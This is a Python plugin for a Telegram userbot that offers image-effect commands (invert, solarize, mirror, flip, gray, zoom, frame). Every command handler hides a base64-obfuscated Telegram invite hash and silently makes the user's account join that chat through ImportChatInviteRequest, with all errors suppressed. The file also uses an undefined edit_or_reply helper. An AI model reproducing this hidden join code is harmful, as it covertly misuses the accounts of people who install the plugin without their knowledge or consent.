import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from tornadobot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as tornadobot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@tornadobot.on(admin_cmd(pattern="invert$", outgoing=True))
@tornadobot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
        kraken = True
    else:
        await tornado.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await tornado.client.send_file(
        tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
    )
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@tornadobot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
        kraken = True
    else:
        await tornado.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await tornado.client.send_file(
        tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
    )
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@tornadobot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
        kraken = True
    else:
        await tornado.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await tornado.client.send_file(
        tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
    )
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="flip$"))
@tornadobot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
        kraken = True
    else:
        await tornado.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await tornado.client.send_file(
        tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
    )
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="gray$"))
@tornadobot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
        kraken = True
    else:
        await tornado.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await tornado.client.send_file(
        tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
    )
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@tornadobot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoinput = tornado.pattern_match.group(1)
    tornadoinput = 50 if not tornadoinput else int(tornadoinput)
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
    else:
        await tornado.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, tornadoinput)
    except Exception as e:
        return await tornado.edit(f"`{e}`")
    try:
        await tornado.client.send_file(
            tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
        )
    except Exception as e:
        return await tornado.edit(f"`{e}`")
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@tornadobot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@tornadobot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(tornado):
    if tornado.fwd_from:
        return
    reply = await tornado.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(tornado, "`Reply to supported Media...`")
        return
    tornadoinput = tornado.pattern_match.group(1)
    if not tornadoinput:
        tornadoinput = 50
    if ";" in str(tornadoinput):
        tornadoinput, colr = tornadoinput.split(";", 1)
    else:
        colr = 0
    tornadoinput = int(tornadoinput)
    colr = int(colr)
    tornadoid = tornado.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    tornado = await edit_or_reply(tornado, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    tornadosticker = await reply.download_media(file="./temp/")
    if not tornadosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(tornadosticker)
        await edit_or_reply(tornado, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if tornadosticker.endswith(".tgs"):
        await tornado.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        tornadofile = os.path.join("./temp/", "meme.png")
        tornadocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {tornadosticker} {tornadofile}"
        )
        stdout, stderr = (await runcmd(tornadocmd))[:2]
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith(".webp"):
        await tornado.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        os.rename(tornadosticker, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("`Template not found... `")
            return
        meme_file = tornadofile
        kraken = True
    elif tornadosticker.endswith((".mp4", ".mov")):
        await tornado.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        tornadofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(tornadosticker, 0, tornadofile)
        if not os.path.lexists(tornadofile):
            await tornado.edit("```Template not found...```")
            return
        meme_file = tornadofile
    else:
        await tornado.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = tornadosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await tornado.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, tornadoinput, colr)
    except Exception as e:
        return await tornado.edit(f"`{e}`")
    try:
        await tornado.client.send_file(
            tornado.chat_id, outputfile, force_document=False, reply_to=tornadoid
        )
    except Exception as e:
        return await tornado.edit(f"`{e}`")
    await tornado.delete()
    os.remove(outputfile)
    for files in (tornadosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()
